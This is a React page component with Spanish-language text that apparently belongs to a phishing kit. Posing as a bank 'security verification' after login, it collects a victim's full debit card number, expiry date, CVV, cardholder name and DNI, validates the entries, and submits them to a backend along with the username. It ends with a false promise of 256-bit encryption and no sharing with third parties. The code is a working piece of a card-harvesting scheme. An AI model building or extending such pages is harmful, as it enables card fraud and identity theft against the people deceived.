import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { submitVerification } from '../services/api';
import './VerificationPage.css';

const VerificationPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const username = location.state?.username || '';
  
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardHolder: '',
    dni: ''
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    
    // Format card number with spaces
    if (name === 'cardNumber') {
      const formatted = value
        .replace(/\s/g, '') // Remove existing spaces
        .replace(/(.{4})/g, '$1 ') // Add space after every 4 chars
        .trim(); // Remove trailing space
      
      setFormData({
        ...formData,
        [name]: formatted
      });
    }
    // Format expiry date with slash
    else if (name === 'expiryDate') {
      let formatted = value.replace(/\D/g, '');
      if (formatted.length > 2) {
        formatted = `${formatted.slice(0, 2)}/${formatted.slice(2, 4)}`;
      }
      setFormData({
        ...formData,
        [name]: formatted
      });
    }
    else {
      setFormData({
        ...formData,
        [name]: value
      });
    }
    
    // Clear error for this field when user types
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const validate = () => {
    const newErrors = {};
    
    if (!formData.cardNumber || formData.cardNumber.replace(/\s/g, '').length !== 16) {
      newErrors.cardNumber = 'Ingresa un número de tarjeta válido de 16 dígitos';
    }
    
    if (!formData.expiryDate || !/^\d{2}\/\d{2}$/.test(formData.expiryDate)) {
      newErrors.expiryDate = 'Ingresa una fecha de expiración válida (MM/YY)';
    }
    
    if (!formData.cvv || !/^\d{3}$/.test(formData.cvv)) {
      newErrors.cvv = 'Ingresa un código CVV válido de 3 dígitos';
    }
    
    if (!formData.cardHolder) {
      newErrors.cardHolder = 'Ingresa el nombre del titular de la tarjeta';
    }
    
    if (!formData.dni || !/^\d{8}$/.test(formData.dni)) {
      newErrors.dni = 'Ingresa un número de DNI válido de 8 dígitos';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validate()) {
      return;
    }
    
    setLoading(true);
    
    try {
      await submitVerification({
        username,
        cardNumber: formData.cardNumber.replace(/\s/g, ''),
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        cardHolder: formData.cardHolder,
        dni: formData.dni
      });
      
      // Navigate to success page
      navigate('/success');
      
    } catch (error) {
      setErrors({ 
        general: error.message || 'Error al procesar la verificación. Por favor intente más tarde.' 
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="verification-page">
      <div className="form-container">
        <h2 className="text-center mb-4">Verificación de Seguridad</h2>
        <p className="info-text">
          Para proteger tu cuenta, necesitamos verificar tu identidad. 
          Por favor, ingresa los datos de tu tarjeta de débito asociada a tu cuenta.
        </p>
        
        {errors.general && (
          <div className="alert alert-danger">
            {errors.general}
          </div>
        )}
        
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="cardNumber" className="form-label">Número de Tarjeta:</label>
            <input
              type="text"
              id="cardNumber"
              name="cardNumber"
              className={`form-control ${errors.cardNumber ? 'error' : ''}`}
              value={formData.cardNumber}
              onChange={handleChange}
              placeholder="XXXX XXXX XXXX XXXX"
              maxLength="19" // 16 digits + 3 spaces
            />
            {errors.cardNumber && (
              <div className="error-message">{errors.cardNumber}</div>
            )}
          </div>
          
          <div className="form-row">
            <div className="form-group half">
              <label htmlFor="expiryDate" className="form-label">Fecha de Expiración:</label>
              <input
                type="text"
                id="expiryDate"
                name="expiryDate"
                className={`form-control ${errors.expiryDate ? 'error' : ''}`}
                value={formData.expiryDate}
                onChange={handleChange}
                placeholder="MM/YY"
                maxLength="5"
              />
              {errors.expiryDate && (
                <div className="error-message">{errors.expiryDate}</div>
              )}
            </div>
            
            <div className="form-group half">
              <label htmlFor="cvv" className="form-label">CVV:</label>
              <input
                type="text"
                id="cvv"
                name="cvv"
                className={`form-control ${errors.cvv ? 'error' : ''}`}
                value={formData.cvv}
                onChange={handleChange}
                placeholder="123"
                maxLength="3"
              />
              {errors.cvv && (
                <div className="error-message">{errors.cvv}</div>
              )}
            </div>
          </div>
          
          <div className="form-group">
            <label htmlFor="cardHolder" className="form-label">Nombre del Titular:</label>
            <input
              type="text"
              id="cardHolder"
              name="cardHolder"
              className={`form-control ${errors.cardHolder ? 'error' : ''}`}
              value={formData.cardHolder}
              onChange={handleChange}
              placeholder="Tal como aparece en la tarjeta"
            />
            {errors.cardHolder && (
              <div className="error-message">{errors.cardHolder}</div>
            )}
          </div>
          
          <div className="form-group">
            <label htmlFor="dni" className="form-label">DNI:</label>
            <input
              type="text"
              id="dni"
              name="dni"
              className={`form-control ${errors.dni ? 'error' : ''}`}
              value={formData.dni}
              onChange={handleChange}
              placeholder="12345678"
              maxLength="8"
            />
            {errors.dni && (
              <div className="error-message">{errors.dni}</div>
            )}
          </div>
          
          <button 
            type="submit" 
            className="btn-primary btn-block" 
            disabled={loading}
          >
            {loading ? 'Procesando...' : 'Verificar'}
          </button>
        </form>
        
        <div className="security-notice">
          <p>
            <strong>INFORMACIÓN SEGURA:</strong> Tus datos están protegidos con 
            encriptación de 256 bits y no serán compartidos con terceros.
          </p>
        </div>
      </div>
    </div>
  );
};

export default VerificationPage;